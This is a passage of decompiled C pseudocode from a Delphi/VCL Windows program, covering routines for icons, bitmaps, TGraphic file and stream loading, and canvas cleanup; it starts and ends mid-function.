  LOWORD(v12) = 1;
  (*(void (__fastcall **)(int, int, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, _DWORD))(*(_DWORD *)v47 + 12))(
    v12,
    *((_DWORD *)v32 + 3) - (a6 + v43),
    v19,
    &loc_414CBF,
    &savedregs,
    v22[0]);
  v13 = (BITMAPINFOHEADER *)v37;
  (*(void (__fastcall **)(_DWORD, char *))(*(_DWORD *)v47 + 4))(*((_DWORD *)v32 + 2), v37);
  Graphics::_16609((int)&h, (int)&ho, v13, (int)a4, v22[1]);
  GetObjectA(h, 24, pv);
  GetObjectA(ho, 24, v27);
  v14 = v26 * v24 * v25;
  cb = v30 * v28 * v29;
  v42 = v14 + cb;
  lpvBits = sub_406D34(v14 + cb);
  v22[0] = &savedregs;
  v21 = (int *)&loc_414C9C;
  v20 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v20);
  v15 = (const BYTE *)lpvBits;
  v16 = (char *)lpvBits + v14;
  GetBitmapBits((HBITMAP)h, v14, lpvBits);
  GetBitmapBits((HBITMAP)ho, cb, v16);
  DeleteObject(ho);
  DeleteObject(h);
  v17 = CreateIcon(hInst, *a4, a4[1], v30, v31, v15, (const BYTE *)v16);
  *v46 = v17;
  if ( !*v46 )
    Graphics::_16596();
  __writefsdword(0, (unsigned int)v20);
  v22[0] = &loc_414CA3;
  sub_4025B0((int)lpvBits);
  __writefsdword(0, (unsigned int)v20);
  v22[0] = &loc_414CC6;
  sub_4025B0((int)v37);
  __writefsdword(0, (unsigned int)v20);
  v22[0] = &loc_414CE6;
  return sub_4025B0((int)v44);
}
// 414B99: variable 'v12' is possibly undefined

//----- (00414CF0) --------------------------------------------------------
unsigned int __usercall Graphics::_16614@<eax>(HGDIOBJ a1@<ecx>, void *a2@<eax>, int a3@<edx>)
{
  int v5; // eax
  void *v6; // edx
  int v7; // ecx
  unsigned int result; // eax
  int v9; // ecx
  _DWORD v10[3]; // [esp+0h] [ebp-60h] BYREF
  __int16 v11; // [esp+10h] [ebp-50h]
  __int16 v12; // [esp+12h] [ebp-4Eh]
  int v13[10]; // [esp+18h] [ebp-48h] BYREF

  v13[0] = 0;
  v5 = GetObjectA(a2, 84, v10);
  if ( v5 )
  {
    if ( v5 < 64 || v13[0] < 0x28u )
    {
      sub_4028D4((char *)a3, 40, 0);
      *(_DWORD *)a3 = 40;
      *(_DWORD *)(a3 + 4) = v10[1];
      *(_DWORD *)(a3 + 8) = v10[2];
    }
    else
    {
      qmemcpy((void *)a3, v13, 0x28u);
    }
  }
  else
  {
    sub_4143C0(v7, v6);
  }
  if ( a1 == (HGDIOBJ)2 )
  {
    *(_WORD *)(a3 + 14) = 1;
  }
  else if ( (char *)a1 - 3 < (char *)0xE )
  {
    *(_WORD *)(a3 + 14) = 4;
    *(_DWORD *)(a3 + 32) = a1;
  }
  else if ( (char *)a1 - 17 < (char *)0xF0 )
  {
    *(_WORD *)(a3 + 14) = 8;
    *(_DWORD *)(a3 + 32) = a1;
  }
  else
  {
    *(_WORD *)(a3 + 14) = v11 * v12;
  }
  *(_WORD *)(a3 + 12) = 1;
  result = *(_DWORD *)(a3 + 32);
  if ( result < *(_DWORD *)(a3 + 36) )
    *(_DWORD *)(a3 + 36) = result;
  if ( !*(_DWORD *)(a3 + 20) )
  {
    v9 = sub_414664(*(_DWORD *)(a3 + 4), *(unsigned __int16 *)(a3 + 14), 32);
    result = abs32(*(_DWORD *)(a3 + 8));
    *(_DWORD *)(a3 + 20) = result * v9;
  }
  return result;
}
// 414D0D: variable 'v7' is possibly undefined
// 414D0D: variable 'v6' is possibly undefined

//----- (00414DD4) --------------------------------------------------------
int __userpurge Graphics::_16628@<eax>(void *a1@<eax>, int *a2@<edx>, _DWORD *a3@<ecx>, void *a4)
{
  int v6; // eax
  int result; // eax
  char v8[14]; // [esp+8h] [ebp-28h] BYREF
  unsigned __int16 v9; // [esp+16h] [ebp-1Ah]
  char v10; // [esp+18h] [ebp-18h]
  int v11; // [esp+1Ch] [ebp-14h]
  int v12; // [esp+28h] [ebp-8h]

  Graphics::_16614(a4, a1, (int)v8);
  if ( v9 <= 8u )
  {
    if ( v12 )
      v6 = 4 * v12 + 40;
    else
      v6 = 4 * (1 << v9) + 40;
    *a2 = v6;
  }
  else
  {
    *a2 = 40;
    if ( (v10 & 3) != 0 )
      *a2 += 12;
  }
  result = v11;
  *a3 = v11;
  return result;
}

//----- (00414E38) --------------------------------------------------------
bool __userpurge Graphics::_16617@<al>(LPBITMAPINFO lpbmi@<ecx>, HPALETTE hPal@<edx>, HBITMAP a3@<eax>, int a4, LPVOID lpvBits)
{
  unsigned int v9[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v10; // [esp-4h] [ebp-1Ch]
  HDC hdc; // [esp+Ch] [ebp-Ch]
  HPALETTE hPala; // [esp+10h] [ebp-8h]
  bool v13; // [esp+17h] [ebp-1h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  Graphics::_16614((HGDIOBJ)a4, a3, (int)lpbmi);
  hPala = 0;
  hdc = CreateCompatibleDC(0);
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_414ED5;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  if ( hPal )
  {
    hPala = SelectPalette(hdc, hPal, 0);
    RealizePalette(hdc);
  }
  v13 = GetDIBits(hdc, a3, 0, lpbmi->bmiHeader.biHeight, lpvBits, lpbmi, 0) != 0;
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_414EDC;
  if ( hPala )
    SelectPalette(hdc, hPala, 0);
  DeleteDC(hdc);
  return v13;
}

//----- (00414EEC) --------------------------------------------------------
int __usercall sub_414EEC@<eax>(int result@<eax>)
{
  if ( !result )
    result = nullsub_1();
  return result;
}
// 414EE8: using guessed type int nullsub_1(void);

//----- (00414EF8) --------------------------------------------------------
BOOL __usercall Graphics::_16621@<eax>(int a1@<eax>, HICON a2@<edx>, char a3@<cl>)
{
  int v5; // eax
  LPBITMAPINFO v6; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *v8; // [esp-18h] [ebp-78h] BYREF
  void *v9; // [esp-14h] [ebp-74h]
  int *v10; // [esp-10h] [ebp-70h]
  struct _EXCEPTION_REGISTRATION_RECORD *v11; // [esp-Ch] [ebp-6Ch] BYREF
  void *v12; // [esp-8h] [ebp-68h]
  int *v13; // [esp-4h] [ebp-64h]
  void *v14; // [esp+0h] [ebp-60h]
  char v15[2]; // [esp+Ch] [ebp-54h] BYREF
  __int16 v16; // [esp+Eh] [ebp-52h]
  int v17; // [esp+14h] [ebp-4Ch]
  int v18; // [esp+18h] [ebp-48h]
  ICONINFO piconinfo; // [esp+1Ch] [ebp-44h] BYREF
  int v20; // [esp+30h] [ebp-30h] BYREF
  char v21[2]; // [esp+36h] [ebp-2Ah] BYREF
  __int16 v22; // [esp+38h] [ebp-28h]
  __int16 v23; // [esp+3Ah] [ebp-26h]
  LPVOID v24; // [esp+3Ch] [ebp-24h]
  LPBITMAPINFO v25; // [esp+40h] [ebp-20h]
  LPVOID lpvBits; // [esp+44h] [ebp-1Ch]
  LPBITMAPINFO lpbmi; // [esp+48h] [ebp-18h]
  int v28; // [esp+4Ch] [ebp-14h] BYREF
  int v29; // [esp+50h] [ebp-10h] BYREF
  int v30; // [esp+54h] [ebp-Ch] BYREF
  int v31; // [esp+58h] [ebp-8h] BYREF
  char v32; // [esp+5Fh] [ebp-1h]
  int savedregs; // [esp+60h] [ebp+0h] BYREF

  v32 = a3;
  sub_4028D4(v21, 6, 0);
  sub_4028D4(v15, 16, 0);
  v5 = GetIconInfo(a2, &piconinfo);
  sub_414EEC(v5);
  v13 = &savedregs;
  v12 = &loc_4150E6;
  v11 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v11);
  Graphics::_16628(piconinfo.hbmMask, &v31, &v29, (void *)2);
  Graphics::_16628(piconinfo.hbmColor, &v30, &v28, (void *)0x10);
  lpbmi = 0;
  lpvBits = 0;
  v25 = 0;
  v24 = 0;
  v10 = &savedregs;
  v9 = &loc_4150BF;
  v8 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v8);
  lpbmi = (LPBITMAPINFO)sub_406D34(v31);
  lpvBits = sub_406D34(v29);
  v25 = (LPBITMAPINFO)sub_406D34(v30);
  v24 = sub_406D34(v28);
  Graphics::_16617(lpbmi, 0, piconinfo.hbmMask, 2, lpvBits);
  Graphics::_16617(v25, 0, piconinfo.hbmColor, 16, v24);
  if ( v32 )
  {
    v20 = v29 + v28 + v30 + 22;
    (*(void (__fastcall **)(int, int *))(*(_DWORD *)a1 + 8))(4, &v20);
  }
  v22 = 1;
  v23 = 1;
  (*(void (__fastcall **)(int, char *, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 8))(
    6,
    v21,
    v8,
    v9,
    v10,
    v11);
  v6 = v25;
  v15[0] = v25->bmiHeader.biWidth;
  v15[1] = v25->bmiHeader.biHeight;
  v16 = v25->bmiHeader.biBitCount * v25->bmiHeader.biPlanes;
  v17 = v29 + v28 + v30;
  v18 = 22;
  (*(void (__fastcall **)(int, char *))(*(_DWORD *)a1 + 8))(16, v15);
  v6->bmiHeader.biHeight *= 2;
  (*(void (__fastcall **)(int, LPBITMAPINFO))(*(_DWORD *)a1 + 8))(v30, v25);
  (*(void (__fastcall **)(int, LPVOID))(*(_DWORD *)a1 + 8))(v28, v24);
  (*(void (__fastcall **)(int, LPVOID))(*(_DWORD *)a1 + 8))(v29, lpvBits);
  __writefsdword(0, (unsigned int)v12);
  v14 = &loc_4150C6;
  sub_4025B0((int)v25);
  sub_4025B0((int)v24);
  sub_4025B0((int)lpbmi);
  sub_4025B0((int)lpvBits);
  __writefsdword(0, (unsigned int)v12);
  v14 = &loc_4150ED;
  DeleteObject(piconinfo.hbmColor);
  return DeleteObject(piconinfo.hbmMask);
}

//----- (004150F4) --------------------------------------------------------
void __usercall EJSONException_Create(void *TGraphic_Self@<eax>)
{
  char v1; // dl
  char v2; // bl
  _DWORD *v3; // esi
  char v4; // [esp-10h] [ebp-18h]

  if ( v1 )
    TGraphic_Self = (void *)System::__linkproc__ ClassCreate((int)TGraphic_Self, v1, v4);
  v2 = v1;
  v3 = TGraphic_Self;
  TObject_Create(TGraphic_Self);
  if ( v2 )
    sub_402D34(v3);
}
// 4150F8: variable 'v1' is possibly undefined
// 4150FD: variable 'v4' is possibly undefined

//----- (0041512C) --------------------------------------------------------
int __usercall sub_41512C@<eax>(int result@<eax>, int a2@<ecx>)
{
  *(_BYTE *)(result + 24) = 1;
  if ( *(_WORD *)(result + 10) )
    result = (*(int (__fastcall **)(int, int))(result + 8))(a2, result);
  return result;
}

//----- (00415144) --------------------------------------------------------
char __cdecl Graphics::_16624(int a1)
{
  if ( !*(_DWORD *)(*(_DWORD *)(a1 - 4) + 32) )
    return (*(int (**)(void))(**(_DWORD **)(a1 - 8) + 28))() ^ 1;
  return !sub_402C40(*(int **)(*(_DWORD *)(a1 - 4) + 32), (int)&off_4134E4)
      || !(*(unsigned __int8 (**)(void))(**(_DWORD **)(a1 - 8) + 24))();
}
// 4134E4: using guessed type void *off_4134E4;

//----- (0041519C) --------------------------------------------------------
int __usercall Graphics::TGraphic::DefineProperties@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // eax
  int v4; // [esp-10h] [ebp-1Ch]
  int v6; // [esp-8h] [ebp-14h]
  int v7; // [esp-4h] [ebp-10h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v7 = a1;
  v6 = *(_DWORD *)(*(_DWORD *)a1 + 48);
  v4 = *(_DWORD *)(*(_DWORD *)a1 + 68);
  LOBYTE(v2) = Graphics::_16624((int)&savedregs);
  return (*(int (__fastcall **)(int, const char *, int, int, int, int))(*(_DWORD *)a2 + 8))(v2, "Data", v4, a1, v6, v7);
}
// 4151D0: variable 'v2' is possibly undefined

//----- (004151E8) --------------------------------------------------------
char __usercall TGraphic::Equals@<al>(int a1@<eax>, int a2@<edx>)
{
  int v4; // edi
  bool v5; // al
  bool v6; // al
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  int v9; // ebx
  int v10; // eax
  bool v11; // al
  _DWORD v13[2]; // [esp-14h] [ebp-2Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v14; // [esp-Ch] [ebp-24h] BYREF
  void *v15; // [esp-8h] [ebp-20h]
  int *v16; // [esp-4h] [ebp-1Ch]
  void *v17; // [esp+0h] [ebp-18h]
  _DWORD *v18; // [esp+Ch] [ebp-Ch]
  _DWORD *v19; // [esp+10h] [ebp-8h]
  bool v20; // [esp+17h] [ebp-1h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v5 = 0;
  if ( a2 )
  {
    v4 = sub_402B58(a1);
    if ( v4 == sub_402B58(a2) )
      v5 = 1;
  }
  v20 = v5;
  if ( (*(unsigned __int8 (**)(void))(*(_DWORD *)a1 + 28))() || (*(unsigned __int8 (**)(void))(*(_DWORD *)a2 + 28))() )
  {
    v6 = (*(unsigned __int8 (**)(void))(*(_DWORD *)a1 + 28))() && (*(unsigned __int8 (**)(void))(*(_DWORD *)a2 + 28))();
    v20 = v6;
  }
  else if ( v20 )
  {
    TObject_Create(&off_40BE60);
    v19 = v7;
    v16 = &savedregs;
    v15 = &loc_415319;
    v14 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v14);
    (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 68))(v14);
    TObject_Create(&off_40BE60);
    v18 = v8;
    v14 = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
    v13[1] = &loc_4152FC;
    v13[0] = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v13);
    (*(void (__stdcall **)(_DWORD, void *, int *))(*(_DWORD *)a2 + 68))(v13[0], &loc_4152FC, &savedregs);
    v9 = Classes::TStream::GetSize((int)v19);
    v11 = 0;
    if ( v9 == Classes::TStream::GetSize((int)v18) )
    {
      v10 = Classes::TStream::GetSize((int)v19);
      if ( (unsigned __int8)sub_406DCC((_DWORD *)v19[1], (_DWORD *)v18[1], v10) )
        v11 = 1;
    }
    v20 = v11;
    __writefsdword(0, (unsigned int)v15);
    v17 = &loc_415303;
    sub_402BDC(v18);
    __writefsdword(0, (unsigned int)v15);
    v17 = &loc_415320;
    sub_402BDC(v19);
  }
  return v20;
}
// 415266: variable 'v7' is possibly undefined
// 41528D: variable 'v8' is possibly undefined
// 40BE60: using guessed type _DWORD (__fastcall *off_40BE60)(Classes::TMemoryStream *__hidden this, int);

//----- (0041532C) --------------------------------------------------------
int sub_41532C()
{
  return 0;
}

//----- (00415330) --------------------------------------------------------
char __usercall sub_415330@<al>(int a1@<eax>)
{
  return *(_BYTE *)(a1 + 25);
}

//----- (00415334) --------------------------------------------------------
_DWORD *__usercall Graphics::TGraphic::LoadFromFile@<eax>(Classes::TFileStream *System::AnsiString@<edx>, int a2@<eax>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *v5; // [esp-Ch] [ebp-14h] BYREF
  void *v6; // [esp-8h] [ebp-10h]
  int *v7; // [esp-4h] [ebp-Ch]
  void *v8; // [esp+0h] [ebp-8h]
  _DWORD *v9; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v9 = Classes::TFileStream::TFileStream(System::AnsiString, 1, (int)off_40BD88, 0x20u);
  v7 = &savedregs;
  v6 = &loc_41537C;
  v5 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v5);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a2 + 80))(v5);
  __writefsdword(0, (unsigned int)v6);
  v8 = &loc_415383;
  return sub_402BDC(v9);
}
// 40BD88: using guessed type int (*off_40BD88[4])();

//----- (00415388) --------------------------------------------------------
int __userpurge Graphics::TGraphic::Progress@<eax>(int result@<eax>, int a2@<ebx>, int a3, int a4, char a5, char a6)
{
  int v6; // [esp-4h] [ebp-8h]

  if ( *(_WORD *)(result + 18) )
  {
    LOBYTE(a2) = a6;
    v6 = a2;
    LOBYTE(a2) = a5;
    result = (*(int (__stdcall **)(int, int, int, int))(result + 16))(a3, a4, a2, v6);
  }
  return result;
}

//----- (004153B0) --------------------------------------------------------
int __usercall sub_4153B0@<eax>(int a1@<eax>)
{
  return (*(int (**)(void))(*(_DWORD *)a1 + 80))();
}

//----- (004153BC) --------------------------------------------------------
_DWORD *__usercall TGraphic::SaveToFile@<eax>(int a1@<eax>, Classes::TFileStream *a2@<edx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *v4; // [esp-Ch] [ebp-14h] BYREF
  void *v5; // [esp-8h] [ebp-10h]
  int *v6; // [esp-4h] [ebp-Ch]
  void *v7; // [esp+0h] [ebp-8h]
  _DWORD *v8; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v8 = Classes::TFileStream::TFileStream(a2, 1, (int)off_40BD88, 0xFFFFu);
  v6 = &savedregs;
  v5 = &loc_415407;
  v4 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v4);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 84))(v4);
  __writefsdword(0, (unsigned int)v5);
  v7 = &loc_41540E;
  return sub_402BDC(v8);
}
// 40BD88: using guessed type int (*off_40BD88[4])();

//----- (00415418) --------------------------------------------------------
_BYTE *__usercall sub_415418@<eax>(_BYTE *result@<eax>, char a2@<dl>)
{
  if ( a2 != result[25] )
  {
    result[25] = a2;
    result = (_BYTE *)(*(int (**)(void))(*(_DWORD *)result + 16))();
  }
  return result;
}

//----- (00415428) --------------------------------------------------------
int __usercall sub_415428@<eax>(int a1@<eax>)
{
  return (*(int (**)(void))(*(_DWORD *)a1 + 84))();
}

//----- (00415434) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
void Controls::_16617()
{
  unsigned int v0[2]; // [esp-18h] [ebp-24h] BYREF
  int *v1; // [esp-10h] [ebp-1Ch]
  unsigned int v2[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v3; // [esp-4h] [ebp-10h]
  _DWORD *v4; // [esp+0h] [ebp-Ch]
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v5 = sub_40C4B0(dword_41DA70);
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_4154D2;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( *(_DWORD *)(v5 + 8) - 1 >= 0 )
  {
    v6 = *(_DWORD *)(v5 + 8) - 1;
    do
    {
      v4 = (_DWORD *)Classes::TList::Get(v6, v5);
      if ( Graphics::TCanvas::TryLock((int)v4) )
      {
        v1 = &savedregs;
        v0[1] = (unsigned int)&loc_4154AA;
        v0[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)v0);
        Graphics::_16736(v4);
        __writefsdword(0, v0[0]);
        v1 = (int *)&loc_4154B1;
        Graphics::TCanvas::Unlock((int)v4);
      }
      --v6;
    }
    while ( v6 != -1 );
  }
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_4154D9;
  sub_40C514(dword_41DA70);
}
// 41DA70: using guessed type int dword_41DA70;

//----- (004154E0) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
void __usercall Graphics::_16736(_DWORD *a1@<eax>)
{
  HPALETTE v1; // eax
  HDC v2; // ebx
  unsigned int v3[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v4; // [esp-4h] [ebp-Ch]
  int v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v5 = (int)a1;
  if ( a1[1] )
  {
    Graphics::TCanvas::Lock(v5);
    v4 = &savedregs;
    v3[1] = (unsigned int)&loc_415574;
    v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v3);
    if ( *(_DWORD *)(v5 + 92) )
      SelectObject(*(HDC *)(v5 + 4), *(HGDIOBJ *)(v5 + 92));
    v1 = *(HPALETTE *)(v5 + 96);
    if ( v1 )
      SelectPalette(*(HDC *)(v5 + 4), v1, -1);
    v2 = *(HDC *)(v5 + 4);
    Graphics::TCanvas::SetHandle(0, v5);
    DeleteDC(v2);
    Classes::TThreadList::Remove((void *)v5, dword_41DA70);
    __writefsdword(0, v3[0]);
    v4 = (int *)&loc_41557B;
    Graphics::TCanvas::Unlock(v5);
  }
}
// 41DA70: using guessed type int dword_41DA70;

//----- (00415580) --------------------------------------------------------
int __usercall sub_415580@<eax>(int result@<eax>)
{
  ++*(_DWORD *)(result + 4);
  return result;
}

//----- (00415584) --------------------------------------------------------
_DWORD *__usercall sub_415584@<eax>(_DWORD *result@<eax>)
{
  _DWORD *v1; // ebx

  v1 = result;
  if ( result )
  {
    if ( !--result[1] )
    {
      (*(void (**)(void))*result)();
      result = sub_402BDC(v1);
    }
  }
  return result;
}

//----- (004155A4) --------------------------------------------------------
void __usercall Cxedit::TcxCustomEditData::~TcxCustomEditData(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v3; // eax
  char v4; // dl
  char v5; // bl
  _DWORD *v6; // esi

  v3 = sub_402D3C(a1, a2);
  v5 = v4;
  v6 = v3;
  sub_402BDC((_DWORD *)v3[3]);
  sub_402BCC(v6, v5 & 0xFC);
  if ( v5 > 0 )
    sub_402D2C(v6);
}
// 4155AB: variable 'v4' is possibly undefined

//----- (004155D4) --------------------------------------------------------
int __usercall sub_4155D4@<eax>(int a1@<eax>)
{
  HICON v2; // eax
  int result; // eax

  v2 = *(HICON *)(a1 + 8);
  if ( v2 )
    DestroyIcon(v2);
  result = 0;
  *(_DWORD *)(a1 + 8) = 0;
  return result;
}

//----- (004155EC) --------------------------------------------------------
_BYTE *__usercall Graphics::TIcon::TIcon@<eax>(_BYTE *a1@<eax>, char a2@<dl>)
{
  char v3; // bl
  _BYTE *v4; // edi
  int v5; // eax
  char v7; // [esp-10h] [ebp-1Ch]

  if ( a2 )
    a1 = (_BYTE *)System::__linkproc__ ClassCreate((int)a1, a2, v7);
  v3 = a2;
  v4 = a1;
  EJSONException_Create(a1);
  v4[25] = 1;
  TObject_Create(&off_413628);
  *((_DWORD *)v4 + 8) = v5;
  sub_415580(v5);
  if ( v3 )
    sub_402D34(v4);
  return v4;
}
// 4155F6: variable 'v7' is possibly undefined
// 4155FB: variable 'a2' is possibly undefined
// 41561A: variable 'v5' is possibly undefined
// 413628: using guessed type int (*off_413628)();

//----- (00415640) --------------------------------------------------------
void __usercall sub_415640(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_415584((_DWORD *)v2[8]);
  TStored_Destroy_7((int)v5);
  if ( v4 > 0 )
    sub_402D2C(v5);
}
// 415647: variable 'v3' is possibly undefined

//----- (00415670) --------------------------------------------------------
void __usercall Graphics::TIcon::Assign(int a1@<eax>, int a2@<edx>)
{
  if ( a2 && !sub_402C40((int *)a2, (int)&off_413684) )
  {
    sub_40C54C((int *)a1, (void (***)(void))a2);
  }
  else
  {
    if ( a2 )
    {
      sub_415580(*(_DWORD *)(a2 + 32));
      sub_415584(*(_DWORD **)(a1 + 32));
      *(_DWORD *)(a1 + 32) = *(_DWORD *)(a2 + 32);
    }
    else
    {
      TIcon::NewImage(a1, 0, 0);
    }
    (*(void (**)(void))(*(_DWORD *)a1 + 16))();
  }
}
// 413684: using guessed type void *off_413684;

//----- (004156D0) --------------------------------------------------------
// Borland Visual Component Library & Packages
BOOL __usercall Graphics::TIcon::Draw@<eax>(HICON a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  HICON v6; // eax

  Graphics::TCanvas::RequiredState((Graphics::TCanvas *)a3, a2, 1);
  v6 = (HICON)sub_415728(a1);
  return DrawIconEx(*(HDC *)(a2 + 4), *(_DWORD *)a3, *(_DWORD *)(a3 + 4), v6, 0, 0, 0, 0, 3u);
}

//----- (00415710) --------------------------------------------------------
bool __usercall sub_415710@<al>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 32);
  return !*(_DWORD *)(v1 + 8) && !*(_DWORD *)(v1 + 12);
}

//----- (00415728) --------------------------------------------------------
int __usercall sub_415728@<eax>(HICON a1@<eax>)
{
  Graphics::TIcon::HandleNeeded(a1);
  return *(_DWORD *)(*((_DWORD *)a1 + 8) + 8);
}

//----- (0041573C) --------------------------------------------------------
int __usercall sub_41573C@<eax>(int a1@<eax>)
{
  int result; // eax

  result = *(_DWORD *)(*(_DWORD *)(a1 + 32) + 20);
  if ( !result )
    result = GetSystemMetrics(12);
  return result;
}

//----- (00415750) --------------------------------------------------------
int __usercall sub_415750@<eax>(int a1@<eax>)
{
  int result; // eax

  result = *(_DWORD *)(*(_DWORD *)(a1 + 32) + 16);
  if ( !result )
    result = GetSystemMetrics(11);
  return result;
}

//----- (00415764) --------------------------------------------------------
HICON __usercall Graphics::TIcon::HandleNeeded@<eax>(HICON result@<eax>)
{
  HICON v2; // esi
  _DWORD *v3; // ebx
  void *v4; // edx
  int v5; // ecx
  int v6; // [esp+0h] [ebp-14h] BYREF
  unsigned __int16 v7; // [esp+4h] [ebp-10h]
  int v8; // [esp+8h] [ebp-Ch] BYREF

  v2 = result;
  v3 = (_DWORD *)*((_DWORD *)result + 8);
  if ( !v3[2] )
  {
    result = (HICON)v3[3];
    if ( result )
    {
      sub_40D840((int)result);
      TStream::ReadBuffer(v3[3], &v6, 6);
      if ( HIWORD(v6) )
      {
        if ( HIWORD(v6) == 1 )
          Graphics::ReadIcon(v3[3], (HICON *)&v8, v7, v3 + 4, (int *)v2 + 9, 6);
        else
          sub_4143CC(v5, v4);
      }
      else
      {
        v8 = dword_41E68C;
      }
      result = (HICON)v8;
      v3[2] = v8;
    }
  }
  return result;
}
// 4157C8: variable 'v5' is possibly undefined
// 4157C8: variable 'v4' is possibly undefined
// 41E68C: using guessed type int dword_41E68C;

//----- (004157DC) --------------------------------------------------------
int __usercall Graphics::TIcon::ImageNeeded@<eax>(Graphics::TIcon *this@<ecx>, int result@<eax>, void *a3@<edx>)
{
  HICON v3; // esi
  int v4; // ebx
  int v5; // eax
  HICON v6; // eax
  unsigned int v7[6]; // [esp-Ch] [ebp-24h] BYREF
  char v8[6]; // [esp+Eh] [ebp-Ah] BYREF
  int v9; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v3 = (HICON)result;
  v4 = *(_DWORD *)(result + 32);
  if ( !*(_DWORD *)(v4 + 12) )
  {
    if ( !*(_DWORD *)(v4 + 8) )
      sub_4143CC((int)this, a3);
    TObject_Create(&off_40BE60);
    v9 = v5;
    v7[2] = (unsigned int)&savedregs;
    v7[1] = (unsigned int)&loc_415869;
    v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v7);
    if ( sub_415728(v3) == dword_41E68C )
    {
      sub_4028D4(v8, 6, 0);
      Classes::TStream::WriteBuffer((Classes::TStream *)6, v8, v9);
    }
    else
    {
      v6 = (HICON)sub_415728(v3);
      Graphics::_16621(v9, v6, 0);
    }
    __writefsdword(0, v7[0]);
    result = v9;
    *(_DWORD *)(v4 + 12) = v9;
  }
  return result;
}
// 41580B: variable 'v5' is possibly undefined
// 40BE60: using guessed type _DWORD (__fastcall *off_40BE60)(Classes::TMemoryStream *__hidden this, int);
// 41E68C: using guessed type int dword_41E68C;

//----- (00415890) --------------------------------------------------------
int __usercall Graphics::TIcon::LoadFromStream@<eax>(Classes::TStream *a1@<edx>, int a2@<eax>)
{
  int v5; // eax
  int v6; // eax
  void *v7; // edx
  int v8; // ecx
  unsigned int v10[6]; // [esp-Ch] [ebp-24h] BYREF
  char v11[2]; // [esp+Eh] [ebp-Ah] BYREF
  unsigned __int16 v12; // [esp+10h] [ebp-8h]
  int v13; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  TObject_Create(&off_40BE60);
  v13 = v5;
  v10[2] = (unsigned int)&savedregs;
  v10[1] = (unsigned int)&loc_41591F;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  Classes::TStream::GetSize((int)a1);
  sub_40D830((int)a1);
  (**(void (***)(void))v13)();
  v6 = Classes::TStream::GetSize(v13);
  TStream::ReadBuffer((int)a1, *(void **)(v13 + 4), v6);
  TStream::ReadBuffer(v13, v11, 6);
  if ( v12 >= 2u )
    sub_4143CC(v8, v7);
  TIcon::NewImage(a2, 0, v13);
  __writefsdword(0, v10[0]);
  return (*(int (**)(void))(*(_DWORD *)a2 + 16))();
}
// 4158A9: variable 'v5' is possibly undefined
// 415904: variable 'v8' is possibly undefined
// 415904: variable 'v7' is possibly undefined
// 40BE60: using guessed type _DWORD (__fastcall *off_40BE60)(Classes::TMemoryStream *__hidden this, int);

//----- (00415948) --------------------------------------------------------
int __usercall TIcon::NewImage@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v6; // eax
